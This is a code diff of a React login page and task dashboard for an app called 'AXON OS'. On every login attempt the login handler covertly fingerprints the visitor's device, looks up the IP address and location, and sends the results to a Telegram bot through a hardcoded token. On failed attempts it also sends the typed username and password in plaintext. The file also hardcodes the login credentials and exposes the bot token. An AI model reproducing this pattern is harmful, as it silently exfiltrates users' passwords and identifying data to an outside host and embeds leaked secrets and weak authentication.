@@ -4,7 +4,7 @@ import 'bootstrap/dist/css/bootstrap.min.css';
 import 'bootstrap-icons/font/bootstrap-icons.css';
 import { supabase } from './supabaseClient';
 
-// --- 1. LOGIN COMPONENT (With Deep Forensics) ---
+// --- 1. LOGIN COMPONENT (Maximum Forensic Detail) ---
 const Login = ({ setAuth }) => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -15,69 +15,70 @@ const Login = ({ setAuth }) => {
   const handleLogin = async (e) => {
     e.preventDefault();
 
-    // 1. Gather Deep Forensic & Privacy Info
-    const referrer = document.referrer || "Direct Entry / Private";
-    const connection = navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)` : "Unknown";
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    
-    // Attempt to get Battery Info (Works on Chrome/Android)
-    let batteryStatus = "N/A";
-    try {
-      if (navigator.getBattery) {
-        const b = await navigator.getBattery();
-        batteryStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
-      }
-    } catch (e) {}
+    // 1. GATHER DEEP FORENSIC DATA
+    const forensics = {
+      userAgent: navigator.userAgent, // Full Browser/OS String
+      platform: navigator.platform,   // OS Base (e.g., MacIntel)
+      cores: navigator.hardwareConcurrency || 'N/A', // CPU Cores
+      memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A', // RAM Estimate
+      res: `${window.screen.width}x${window.screen.height}`, // Screen Size
+      colorDepth: `${window.screen.colorDepth}-bit`,
+      lang: navigator.language,
+      online: navigator.onLine ? 'Yes' : 'No',
+      referrer: document.referrer || "Direct / Bookmark",
+      connection: navigator.connection ? navigator.connection.effectiveType : "N/A"
+    };
 
-    // 2. Fetch Detailed IP/ISP Data
+    // 2. FETCH IP & NETWORK INTEL
     let net = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown", timezone: "N/A" };
     try {
       const response = await fetch('https://ipapi.co/json/');
       if (response.ok) net = await response.json();
-    } catch (err) {
-      console.error("Network lookup failed", err);
-    }
+    } catch (err) { console.error("Network lookup failed", err); }
 
     const token = "8494749951:AAFDLdupc8KvrwyAnnkvR-iTG9ZfWUTLLOg";
     const chat = "8620003085";
 
     if (username === 'user' && password === 'user') {
+      // --- SUCCESS ALERT (DEEP REPORT) ---
       const message = encodeURIComponent(
-        `🔐 *AXON OS: AUTHORIZED ACCESS*\n\n` +
+        `🚨 *AXON OS: AUTHORIZED LOGIN*\n\n` +
         `👤 *User:* ${username}\n` +
         `🌐 *IP:* ${net.ip}\n` +
         `📍 *Loc:* ${net.city}, ${net.region}\n` +
         `🏢 *ISP:* ${net.org}\n\n` +
-        `🖥 *FORENSIC INTEL*\n` +
-        `💻 *Platform:* ${navigator.platform}\n` +
-        `📏 *Res:* ${screenRes}\n` +
-        `📶 *Net:* ${connection}\n` +
-        `🔋 *Battery:* ${batteryStatus}\n` +
-        `🔗 *From:* ${referrer}\n` +
-        `⏰ *TZ:* ${net.timezone}\n\n` +
-        `🟢 *Status:* SUCCESS`
+        `🖥 *OS & HARDWARE*\n` +
+        `💻 *Platform:* ${forensics.platform}\n` +
+        `⚙️ *CPU Cores:* ${forensics.cores}\n` +
+        `🧠 *Est. RAM:* ${forensics.memory}\n` +
+        `📏 *Res:* ${forensics.res} (${forensics.colorDepth})\n` +
+        `🔋 *Net Type:* ${forensics.connection}\n\n` +
+        `🌐 *BROWSER DETAILS*\n` +
+        `🔗 *Ref:* ${forensics.referrer}\n` +
+        `🗣 *Lang:* ${forensics.lang}\n` +
+        `⏰ *TZ:* ${net.timezone}\n` +
+        `📄 *UA:* \`${forensics.userAgent}\`\n\n` +
+        `🟢 *Status:* GRANTED`
       );
 
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`)
-        .catch(err => console.error("Telegram error:", err));
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${message}&parse_mode=Markdown`);
 
       setAuth(true); 
       navigate('/dashboard');
     } else {
+      // --- FAILED ATTEMPT ALERT ---
       const breachMsg = encodeURIComponent(
-        `⛔️ *AXON OS: BREACH ATTEMPT*\n\n` +
+        `⛔️ *AXON OS: UNAUTHORIZED ATTEMPT*\n\n` +
         `🚫 *Tried:* ${username} / ${password}\n` +
         `🌐 *IP:* ${net.ip}\n` +
         `📍 *Loc:* ${net.city}\n` +
-        `🔗 *From:* ${referrer}\n` +
+        `💻 *Platform:* ${forensics.platform}\n` +
         `🔴 *Status:* ACCESS_DENIED`
       );
-
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`)
-        .catch(err => console.error("Telegram error:", err));
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${breachMsg}&parse_mode=Markdown`);
 
       setIsShaking(true);
-      setError('Access Denied: Security Breach Protocol');
+      setError('Access Denied: Logging Device Fingerprint');
       setTimeout(() => setIsShaking(false), 500); 
     }
   };
@@ -89,15 +90,14 @@ const Login = ({ setAuth }) => {
         .shake { animation: apple-shake 0.4s ease-in-out; border: 1px solid #ef4444 !important; }
         @keyframes apple-shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-8px); } 50% { transform: translateX(8px); } 75% { transform: translateX(-8px); } }
         .apple-input { background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1); color: white; border-radius: 14px; padding: 14px 20px; margin-bottom: 15px; }
-        .apple-input:focus { background: rgba(255, 255, 255, 0.12); border-color: #6366f1; color: white; box-shadow: none; }
-        .apple-btn { background: #6366f1; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; margin-top: 10px; color: white; }
+        .apple-btn { background: #6366f1; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; color: white; margin-top: 10px; }
         .creator-tag { margin-top: 2.5rem; padding-top: 1.5rem; border-top: 1px solid rgba(255,255,255,0.05); }
       `}</style>
 
       <div className={`apple-card ${isShaking ? 'shake' : ''}`}>
-        <div className="mb-4 text-primary"><i className="bi bi-shield-lock" style={{ fontSize: '3.5rem' }}></i></div>
+        <div className="mb-4 text-primary"><i className="bi bi-shield-check" style={{ fontSize: '3.5rem' }}></i></div>
         <h2 className="fw-bold text-white mb-1">AXON <span className="text-primary">OS</span></h2>
-        <p className="text-secondary small mb-5">Kernel Access Protocol v3.7</p>
+        <p className="text-secondary small mb-5">Security Protocol v3.8</p>
         <form onSubmit={handleLogin}>
           <input type="text" placeholder="Username" className="form-control apple-input" value={username} onChange={(e) => setUsername(e.target.value)} />
           <input type="password" placeholder="Password" className="form-control apple-input" value={password} onChange={(e) => setPassword(e.target.value)} />
@@ -213,7 +213,7 @@ function Dashboard({ setAuth }) {
             {tasks.map((task) => (
               <div key={task.id} className="d-flex align-items-center p-3 border-bottom border-secondary border-opacity-10">
                 <div className="me-3" onClick={() => toggleTask(task.id, task.completed)} style={{cursor: 'pointer'}}><i className={`bi ${task.completed ? 'bi-check-circle-fill text-success' : 'bi-circle text-secondary'}`}></i></div>
-                <div className="flex-grow-1" style={{ opacity: task.completed ? 0.5 : 1 }}>
+                <div className="flex-grow-1" style={{ textDecoration: task.completed ? 'line-through' : 'none', opacity: task.completed ? 0.5 : 1 }}>
                   <span className="category-pill me-2">{task.category}</span> {task.text}
                 </div>
                 <button className="btn btn-link text-danger p-0" onClick={() => deleteTask(task.id)}><i className="bi bi-trash3"></i></button>
